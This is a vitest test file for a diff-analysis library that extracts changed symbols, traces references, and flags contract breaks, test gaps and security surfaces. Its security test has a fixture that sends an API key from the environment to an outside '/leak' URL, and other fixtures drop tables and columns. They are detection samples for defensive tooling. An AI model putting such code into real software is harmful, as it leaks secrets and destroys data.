import { describe, expect, it } from "vitest";

import {
  analyzeStructuralImpact,
  detectContractBreaks,
  detectSecuritySurfaces,
  detectTestGaps,
  extractChangedSymbols,
  findDownstreamReferences,
} from "../src/index.js";

describe("symbol-extractor", () => {
  it("extracts TypeScript / JavaScript added, modified and deleted symbols", () => {
    const patch = [
      "--- a/src/math.ts",
      "+++ b/src/math.ts",
      "@@ -1,3 +1,7 @@",
      "-export function oldHelper() { return 1; }",
      "-export function add(a: number, b: number): number {",
      "-  return a + b;",
      "+export function add(a: number, b: number, c = 0): number {",
      "+  return a + b + c;",
      "+}",
      "+export const multiply = (a: number, b: number) => a * b;",
      "+export class Calculator {}",
      "+export interface Config {}",
      "+export type Result = number;",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "src/math.ts" }]);
    expect(symbols).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          change: "deleted",
          isExported: true,
          kind: "function",
          name: "oldHelper",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "modified",
          isExported: true,
          kind: "function",
          name: "add",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "constant",
          name: "multiply",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "class",
          name: "Calculator",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "interface",
          name: "Config",
          path: "src/math.ts",
        }),
        expect.objectContaining({
          change: "added",
          isExported: true,
          kind: "type",
          name: "Result",
          path: "src/math.ts",
        }),
      ]),
    );
  });

  it("extracts Python functions and classes with export convention", () => {
    const patch = [
      "--- a/service.py",
      "+++ b/service.py",
      "@@ -0,0 +1,6 @@",
      "+def public_func():",
      "+    pass",
      "+def _private_func():",
      "+    pass",
      "+class UserService:",
      "+    pass",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "service.py" }]);
    const publicFunc = symbols.find((s) => s.name === "public_func");
    const privateFunc = symbols.find((s) => s.name === "_private_func");
    const userService = symbols.find((s) => s.name === "UserService");

    expect(publicFunc).toBeDefined();
    expect(publicFunc?.isExported).toBe(true);
    expect(privateFunc).toBeDefined();
    expect(privateFunc?.isExported).toBe(false);
    expect(userService).toBeDefined();
    expect(userService?.kind).toBe("class");
  });

  it("extracts Go functions and types with uppercase export convention", () => {
    const patch = [
      "--- a/pkg/auth.go",
      "+++ b/pkg/auth.go",
      "@@ -0,0 +1,3 @@",
      "+func Authenticate(token string) bool { return true }",
      "+func internalHash() {}",
      "+type SessionManager struct {}",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "pkg/auth.go" }]);
    const auth = symbols.find((s) => s.name === "Authenticate");
    const internal = symbols.find((s) => s.name === "internalHash");
    const session = symbols.find((s) => s.name === "SessionManager");

    expect(auth?.isExported).toBe(true);
    expect(internal?.isExported).toBe(false);
    expect(session?.isExported).toBe(true);
    expect(session?.kind).toBe("type");
  });

  it("extracts Rust functions and structs with pub visibility", () => {
    const patch = [
      "--- a/src/lib.rs",
      "+++ b/src/lib.rs",
      "@@ -0,0 +1,3 @@",
      "+pub fn process_data() {}",
      "+fn local_helper() {}",
      "+pub struct UserRecord {}",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "src/lib.rs" }]);
    const process = symbols.find((s) => s.name === "process_data");
    const local = symbols.find((s) => s.name === "local_helper");
    const user = symbols.find((s) => s.name === "UserRecord");

    expect(process?.isExported).toBe(true);
    expect(local?.isExported).toBe(false);
    expect(user?.isExported).toBe(true);
  });

  it("extracts Java classes and public methods", () => {
    const patch = [
      "--- a/src/App.java",
      "+++ b/src/App.java",
      "@@ -0,0 +1,3 @@",
      "+public class App {",
      "+  public void start() {}",
      "+}",
    ].join("\n");

    const symbols = extractChangedSymbols([{ patch, path: "src/App.java" }]);
    const appClass = symbols.find((s) => s.name === "App");
    const startMethod = symbols.find((s) => s.name === "start");

    expect(appClass?.isExported).toBe(true);
    expect(appClass?.kind).toBe("class");
    expect(startMethod?.isExported).toBe(true);
    expect(startMethod?.kind).toBe("function");
  });
});

describe("downstream-tracer", () => {
  it("traces downstream references across repository files", () => {
    const symbols = [
      {
        change: "modified" as const,
        isExported: true,
        kind: "function" as const,
        line: 10,
        name: "calculateTotals",
        path: "src/billing.ts",
      },
    ];

    const repoFiles = [
      {
        content:
          "import { calculateTotals } from './billing';\nconst res = calculateTotals(cart);\n",
        path: "src/checkout.ts",
      },
      {
        content: "export function calculateTotals() {}",
        path: "src/billing.ts",
      },
      {
        content: "console.log('Unrelated');",
        path: "src/other.ts",
      },
    ];

    const { references, totalCount } = findDownstreamReferences(
      symbols,
      repoFiles,
    );
    expect(totalCount).toBe(2);
    expect(references).toHaveLength(2);
    expect(references[0]?.callerPath).toBe("src/checkout.ts");
    expect(references[0]?.symbolName).toBe("calculateTotals");
  });

  it("caps references according to maxReferences option", () => {
    const symbols = [
      {
        change: "modified" as const,
        isExported: true,
        kind: "function" as const,
        line: 10,
        name: "helper",
        path: "src/utils.ts",
      },
    ];

    const repoFiles = [
      {
        content: "helper();\nhelper();\nhelper();\n",
        path: "src/consumer.ts",
      },
    ];

    const { references, totalCount } = findDownstreamReferences(
      symbols,
      repoFiles,
      {
        maxReferences: 2,
      },
    );
    expect(totalCount).toBe(3);
    expect(references).toHaveLength(2);
  });
});

describe("contract-break-detector", () => {
  it("detects removed exported symbols", () => {
    const symbols = [
      {
        change: "deleted" as const,
        isExported: true,
        kind: "function" as const,
        line: 20,
        name: "deleteUser",
        path: "src/user.ts",
      },
      {
        change: "deleted" as const,
        isExported: false,
        kind: "function" as const,
        line: 30,
        name: "privateInternal",
        path: "src/user.ts",
      },
    ];

    const breaks = detectContractBreaks([], symbols);
    expect(breaks).toHaveLength(1);
    expect(breaks[0]?.kind).toBe("exported_symbol_removed");
    expect(breaks[0]?.severity).toBe("critical");
    expect(breaks[0]?.description).toContain("deleteUser");
  });

  it("detects destructive SQL migrations and handles deletions and malformed patches", () => {
    const files = [
      {
        patch: [
          "--- a/migrations/0002_drop.sql",
          "+++ b/migrations/0002_drop.sql",
          "@@ -1,1 +1,2 @@",
          "-SELECT 1;",
          "+ALTER TABLE users DROP COLUMN legacy_auth;",
          "+DROP TABLE old_audit_logs;",
        ].join("\n"),
        path: "migrations/0002_drop.sql",
      },
      {
        patch: "invalid patch",
        path: "migrations/0003_broken.sql",
      },
    ];

    const breaks = detectContractBreaks(files, []);
    expect(breaks).toHaveLength(2);
    expect(breaks[0]?.kind).toBe("sql_destructive_migration");
    expect(breaks[0]?.description).toContain("DROP COLUMN");
    expect(breaks[1]?.description).toContain("DROP TABLE");
  });
});

describe("test-gap-detector", () => {
  it("detects source files modified without corresponding tests for TS, Go and Python", () => {
    const files = [
      {
        patch: [
          "--- a/src/payment.ts",
          "+++ b/src/payment.ts",
          "@@ -0,0 +1,1 @@",
          "+const x = 1;",
        ].join("\n"),
        path: "src/payment.ts",
      },
      {
        patch: [
          "--- a/pkg/service.go",
          "+++ b/pkg/service.go",
          "@@ -0,0 +1,1 @@",
          "+func Run() {}",
        ].join("\n"),
        path: "pkg/service.go",
      },
      {
        patch: [
          "--- a/app/user.py",
          "+++ b/app/user.py",
          "@@ -0,0 +1,1 @@",
          "+def run(): pass",
        ].join("\n"),
        path: "app/user.py",
      },
      {
        patch: "+# Readme",
        path: "README.md", // non-source file should not trigger gap
      },
    ];

    const gaps = detectTestGaps(files);
    expect(gaps).toHaveLength(3);
    expect(
      gaps.find((g) => g.sourcePath === "src/payment.ts")
        ?.expectedTestPathPattern,
    ).toBe("src/payment.test.ts");
    expect(
      gaps.find((g) => g.sourcePath === "pkg/service.go")
        ?.expectedTestPathPattern,
    ).toBe("pkg/service_test.go");
    expect(
      gaps.find((g) => g.sourcePath === "app/user.py")?.expectedTestPathPattern,
    ).toBe("tests/test_user.py");
  });

  it("returns empty array when only non-source files are modified", () => {
    const files = [
      {
        patch: "+# Doc",
        path: "docs/architecture.md",
      },
    ];
    expect(detectTestGaps(files)).toEqual([]);
  });

  it("handles .mjs, .cjs, .rs, .java without returning the source path itself", () => {
    const files = [
      { patch: "+export const x = 1;", path: "src/handler.mjs" },
      { patch: "+module.exports = {};", path: "src/util.cjs" },
      { patch: "+fn run() {}", path: "src/engine.rs" },
      { patch: "+class Engine {}", path: "src/Engine.java" },
    ];
    const gaps = detectTestGaps(files);
    expect(gaps).toHaveLength(4);
    expect(
      gaps.find((g) => g.sourcePath === "src/handler.mjs")
        ?.expectedTestPathPattern,
    ).toBe("src/handler.test.ts");
    expect(
      gaps.find((g) => g.sourcePath === "src/util.cjs")
        ?.expectedTestPathPattern,
    ).toBe("src/util.test.ts");
    expect(
      gaps.find((g) => g.sourcePath === "src/engine.rs")
        ?.expectedTestPathPattern,
    ).toBe("tests/engine.rs");
    expect(
      gaps.find((g) => g.sourcePath === "src/Engine.java")
        ?.expectedTestPathPattern,
    ).toBe("src/EngineTest.java");
  });

  it("does not report a gap when corresponding test file is in diff", () => {
    const files = [
      {
        patch: [
          "--- a/src/payment.ts",
          "+++ b/src/payment.ts",
          "@@ -0,0 +1,1 @@",
          "+const x = 1;",
        ].join("\n"),
        path: "src/payment.ts",
      },
      {
        patch: [
          "--- a/src/payment.test.ts",
          "+++ b/src/payment.test.ts",
          "@@ -0,0 +1,1 @@",
          "+const t = 1;",
        ].join("\n"),
        path: "src/payment.test.ts",
      },
    ];

    const gaps = detectTestGaps(files);
    expect(gaps).toHaveLength(0);
  });
});

describe("security-surface-detector", () => {
  it("detects added dependencies and secret/egress patterns", () => {
    const files = [
      {
        patch: [
          "--- a/package.json",
          "+++ b/package.json",
          "@@ -10,1 +10,2 @@",
          '   "existing": "1.0.0",',
          '+"untrusted-lib": "^2.1.0",',
        ].join("\n"),
        path: "package.json",
      },
      {
        patch: [
          "--- a/src/api.ts",
          "+++ b/src/api.ts",
          "@@ -0,0 +1,2 @@",
          "+const key = process.env.API_KEY;",
          '+await fetch("https://external-api.com/leak", { body: key });',
        ].join("\n"),
        path: "src/api.ts",
      },
    ];

    const signals = detectSecuritySurfaces(files);
    expect(signals).toHaveLength(3);
    expect(signals[0]?.kind).toBe("new_dependency");
    expect(signals[0]?.excerpt).toContain("untrusted-lib");
    expect(signals[1]?.kind).toBe("secret_or_env_access");
    expect(signals[2]?.kind).toBe("network_egress");
  });
});

describe("analyzeStructuralImpact", () => {
  it("orchestrates all analyzers and returns a unified structural report", () => {
    const changedFiles = [
      {
        patch: [
          "--- a/src/core.ts",
          "+++ b/src/core.ts",
          "@@ -1,1 +1,2 @@",
          "-export function compute() { return 1; }",
          "+export function compute(factor: number) { return factor; }",
          "+export const SECRET = process.env.SECRET_KEY;",
        ].join("\n"),
        path: "src/core.ts",
      },
    ];

    const repositoryFiles = [
      {
        content: "import { compute } from './core';\ncompute();\n",
        path: "src/app.ts",
      },
    ];

    const report = analyzeStructuralImpact({
      changedFiles,
      repositoryFiles,
    });

    expect(report.changedSymbols).toHaveLength(2);
    expect(report.downstreamReferences).toHaveLength(2);
    expect(report.totalDownstreamReferencesCount).toBe(2);
    expect(report.securitySurfaces).toHaveLength(1);
    expect(report.testGaps).toHaveLength(1);
    expect(report.repositoryScanTruncated).toBe(false);
  });

  it("promotes a deterministic destructive SQL signal into a host-verifiable finding", () => {
    const patch = [
      "diff --git a/migrations/002.sql b/migrations/002.sql",
      "--- a/migrations/002.sql",
      "+++ b/migrations/002.sql",
      "@@ -0,0 +1 @@",
      "+DROP TABLE accounts;",
    ].join("\n");

    const report = analyzeStructuralImpact({
      changedFiles: [{ patch, path: "migrations/002.sql" }],
      repositoryFiles: [],
    });

    expect(report.deterministicFindings).toEqual([
      expect.objectContaining({
        confidence: 1,
        evidence: [
          expect.objectContaining({ excerpt: "DROP TABLE accounts;" }),
        ],
        location: {
          line: 1,
          path: "migrations/002.sql",
          side: "RIGHT",
        },
        severity: "critical",
      }),
    ]);
  });
});
